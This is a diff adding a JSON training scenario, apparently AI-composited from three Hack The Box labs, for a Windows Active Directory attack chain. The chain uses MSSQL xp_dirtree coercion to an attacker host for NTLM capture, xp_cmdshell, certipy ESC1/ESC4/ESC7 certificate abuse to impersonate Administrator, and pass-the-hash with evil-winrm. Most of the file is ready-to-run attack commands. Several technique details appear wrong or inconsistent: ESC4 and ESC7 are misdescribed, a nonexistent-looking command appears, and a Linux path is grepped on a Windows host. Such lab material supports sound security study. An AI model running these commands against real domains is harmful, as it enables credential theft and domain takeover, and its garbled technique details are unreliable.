@@ -1,0 +1,276 @@
+{
+  "id": "adcs-escalation-path",
+  "title": "ADCS Escalation Path",
+  "category": "ad-chain",
+  "source": ["HTB Manager","HTB Authority","HTB EscapeTwo"],
+  "designed_by": "ai-composite",
+  "description": "MSSQL → xp_dirtree → ADCS ESC1/ESC4/ESC7. Combines three HTB labs into one ADCS-focused chain.",
+  "introduction": "This scenario teaches ADCS abuse (ESC1/ESC4/ESC7) as a path to domain admin. ADCS misconfigurations are common in enterprise AD and often overlooked.",
+  "mental_model": "Think of ADCS as a second path to DA: if you have any domain creds, always run certipy find to check for vulnerable templates or CA ACLs.",
+  "key_principles": [
+    "Always run certipy find after obtaining domain creds",
+    "ESC1: template allows enrollment for any UPN",
+    "ESC4: CA ACL lets you modify templates",
+    "ESC7: ManageCA/ManageCertificates grants cert enrollment",
+    "xp_dirtree forces MSSQL to authenticate to your Responder"
+  ],
+
+  "indicators": {
+    "difficulty": 7,
+    "cognitive_load": 7,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 6
+  },
+
+  "mitre": {
+    "tactics": ["TA0001","TA0003","TA0004","TA0006","TA0007","TA0008"],
+    "techniques": [
+      {"id":"T1021.002","name":"SMB/Windows Admin Shares"},
+      {"id":"T1558.003","name":"Kerberoasting"},
+      {"id":"T1649","name":"Active Directory Certificate Services"},
+      {"id":"T1552.001","name":"Credentials In Files"},
+      {"id":"T1078","name":"Valid Accounts"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon","T2-Web-Access","T3-NonWeb-Access","T4b-Win-PrivEsc","T5-Credentials","T6-Pivoting","T7-Lateral"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 3, "linux": 0},
+    "has_ad": true,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "adcs","esc1","esc4","esc7","certipy","mssql","xp_dirtree","ansible-vault","pwm",
+    "impacket-mssqlclient","responder","ntlmv2","hashcat","evil-winrm"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [16,17,18,19],
+    "pattern_frequency": "medium",
+    "recommended_order": 6
+  },
+
+  "prerequisites": [],
+  "builds_on": ["ad-permission-gauntlet"],
+
+  "networks": [
+    {"id":"internal","cidr":"10.10.11.0/24","label":"AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id":"manager",
+      "label":"MANAGER",
+      "ip":"10.10.11.236",
+      "os":"Windows",
+      "role":"AD Member (MSSQL)",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":1433,
+          "name":"MSSQL",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"MSSQL guest access (guest user enabled)","leads_to":"xp_dirtree-ntlm"}
+          ],
+          "commands":[
+            {"cmd": "impacket-mssqlclient domain.local/guest@10.10.11.236 -windows-auth", "rationale": "Why: Guest access enables xp_dirtree NTLM relay"},
+            {"cmd": "EXEC xp_dirtree '\\\\<kali-ip>\\share';", "rationale": "Why: Force MSSQL to connect to Responder for NTLM capture"},
+            "EXEC xp_fileexist '\\\\<kali-ip>\\share';"
+          ]
+        },
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with operator creds after NTLM capture","leads_to":"local-user"}
+          ],
+          "commands":[{"cmd": "evil-winrm -i 10.10.11.236 -u operator -H '<ntlm_hash>'", "rationale": "Why: PtH with captured NTLM hash for shell"}]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"operator",
+          "to":"Administrator",
+          "technique":"certipy ESC7 — ManageCA/ManageCertificates on CA operator","commands":[
+            {"cmd": "certipy find -u operator@domain.local -hashes :<ntlm_hash> -dc-ip 10.10.11.42", "rationale": "Why: Discover ESC7 ManageCA/ManageCertificates on CA"},
+            "certipy req -u operator@domain.local -hashes :<ntlm_hash> -ca domain-CA -template ESC7 -upn Administrator@domain.local"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"operator","type":"ntlm-hash","source":"xp_dirtree NTLMv2 capture → website backup (ansible-vault)","unlocks":["manager","authority"]}
+      ],
+      "alternatives":[
+        {"source":"responder","description":"Capture NTLMv2 from xp_dirtree","commands":["responder -I tun0 -wd","# Trigger xp_dirtree from MSSQL to \\\\<kali-ip>\\share"]},
+        {"source":"certipy","description":"Find ADCS misconfigurations","commands":["certipy find -u operator@domain.local -hashes :<ntlm_hash> -dc-ip 10.10.11.42"]},
+        {"source":"certipy","description":"ESC7 abuse — request cert for Administrator","commands":["certipy auth -pfx administrator.pfx -dc-ip 10.10.11.42","getntlmhash -cert administrator.pfx"]}
+      ]
+    },
+    {
+      "id":"authority",
+      "label":"AUTHORITY",
+      "ip":"10.10.11.222",
+      "os":"Windows",
+      "role":"AD Member (ADCS)",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":80,
+          "name":"HTTP (PWM)",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"info-disclosure","summary":"PWM config exposes LDAP creds","leads_to":"ldap-creds"}
+          ],
+          "commands":[
+            "curl http://10.10.11.222/config/config.json",
+            "grep -r ldap /var/www/html/",
+            "# Extract LDAP creds from PWM config"
+          ]
+        },
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with Administrator after ESC1","leads_to":"domain-admin"}
+          ],
+          "commands":["evil-winrm -i 10.10.11.222 -u Administrator -H '<ntlm_hash>'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"svc_user (LDAP)",
+          "to":"Administrator",
+          "technique":"certipy ESC1 — vulnerable template allows enrollment for any user","commands":[
+            "certipy find -u svc_user@domain.local -p '<password>' -dc-ip 10.10.11.42",
+            {"cmd": "certipy req -u svc_user@domain.local -p '<password>' -ca domain-CA -template VulnTemplate -upn Administrator@domain.local", "rationale": "Why: ESC1 template lets you request cert for DA UPN"},
+            {"cmd": "certipy auth -pfx administrator.pfx -dc-ip 10.10.11.42", "rationale": "Why: Convert DA cert to NTLM hash for PtH"}
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"svc_user","type":"password","source":"PWM config LDAP credentials","unlocks":["authority-esc1"]}
+      ],
+      "alternatives":[
+        {"source":"certipy","description":"ESC1 — vulnerable template with EKU for client auth","commands":["certipy req -u svc_user@domain.local -p '<password>' -ca domain-CA -template VulnTemplate -upn Administrator@domain.local"]},
+        {"source":"certipy","description":"Get NT hash from PFX","commands":["certipy auth -pfx administrator.pfx -dc-ip 10.10.11.42","# Use -hash for NT hash output"]}
+      ]
+    },
+    {
+      "id":"escapetwo",
+      "label":"ESCAPETWO",
+      "ip":"10.10.11.51",
+      "os":"Windows",
+      "role":"AD Member (MSSQL)",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":1433,
+          "name":"MSSQL",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"MSSQL sa account (weak password)","leads_to":"xp_dirtree-ntlm"}
+          ],
+          "commands":[
+            "impacket-mssqlclient sa:'<password>'@10.10.11.51",
+            "EXEC xp_dirtree '\\\\<kali-ip>\\share';",
+            "EXEC xp_cmdshell 'whoami';"
+          ]
+        },
+        {
+          "port":5985,
+          "name":"WinRM",
+          "version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with Administrator after ESC4","leads_to":"domain-admin"}
+          ],
+          "commands":["evil-winrm -i 10.10.11.51 -u Administrator -H '<ntlm_hash>'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"mssql_svc (NTLM)",
+          "to":"Administrator",
+          "technique":"certipy ESC4 — vulnerable CA ACL allows cert enrollment","commands":[
+            "certipy find -u mssql_svc@domain.local -hashes :<ntlm_hash> -dc-ip 10.10.11.42",
+            {"cmd": "certipy req -u mssql_svc@domain.local -hashes :<ntlm_hash> -ca domain-CA -template User -upn Administrator@domain.local", "rationale": "Why: ESC4 CA ACL lets enrollment for DA UPN"},
+            "certipy auth -pfx administrator.pfx -dc-ip 10.10.11.42"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"mssql_svc","type":"ntlm-hash","source":"xp_dirtree NTLMv2 capture (Responder)","unlocks":["escapetwo-esc4"]}
+      ],
+      "alternatives":[
+        {"source":"certipy","description":"ESC4 — CA template misconfiguration","commands":["certipy find -u mssql_svc@domain.local -hashes :<ntlm_hash> -dc-ip 10.10.11.42"]},
+        {"source":"certipy","description":"Request certificate for Administrator","commands":["certipy req -u mssql_svc@domain.local -hashes :<ntlm_hash> -ca domain-CA -template User -upn Administrator@domain.local"]}
+      ]
+    }
+  ],
+
+  "connections":[
+    {
+      "from":"manager",
+      "to":"authority",
+      "technique":"Shared credential (operator) or LDAP from PWM",
+      "requires":"operator hash from xp_dirtree + website backup",
+      "pivot":"Same network",
+      "path_ids":["path-manager-authority"],
+      "commands":[
+        "certipy find -u operator@domain.local -hashes :<ntlm_hash> -dc-ip 10.10.11.42",
+        "evil-winrm -i 10.10.11.222 -u operator -H '<ntlm_hash>'"
+      ]
+    },
+    {
+      "from":"authority",
+      "to":"escapetwo",
+      "technique":"ESC1 Administrator → pivot to ESCAPETWO",
+      "requires":"Administrator hash from certipy ESC1",
+      "pivot":"Same network",
+      "path_ids":["path-authority-escapetwo"],
+      "commands":[
+        "evil-winrm -i 10.10.11.51 -u Administrator -H '<ntlm_hash>'"
+      ]
+    }
+  ],
+
+  "attack_paths":[
+    {
+      "id":"path-manager-esc7",
+      "name":"MANAGER: ESC7 (Primary)",
+      "color":"#6bb8cc",
+      "steps":["manager"],
+      "description":"MSSQL guest → xp_dirtree → website backup → operator creds → certipy ESC7 → Administrator"
+    },
+    {
+      "id":"path-authority-esc1",
+      "name":"AUTHORITY: ESC1",
+      "color":"#e8a87c",
+      "steps":["authority"],
+      "description":"PWM config → LDAP creds → ADCS ESC1 → Administrator"
+    },
+    {
+      "id":"path-escapetwo-esc4",
+      "name":"ESCAPETWO: ESC4",
+      "color":"#85e89d",
+      "steps":["escapetwo"],
+      "description":"MSSQL sa → xp_dirtree → NTLMv2 → certipy ESC4 → Administrator"
+    },
+    {
+      "id":"path-full-chain",
+      "name":"Full ADCS Chain",
+      "color":"#d2a8ff",
+      "steps":["manager","authority","escapetwo"],
+      "description":"Manager ESC7 → Authority ESC1 → EscapeTwo ESC4 (all three paths)"
+    }
+  ]
+}
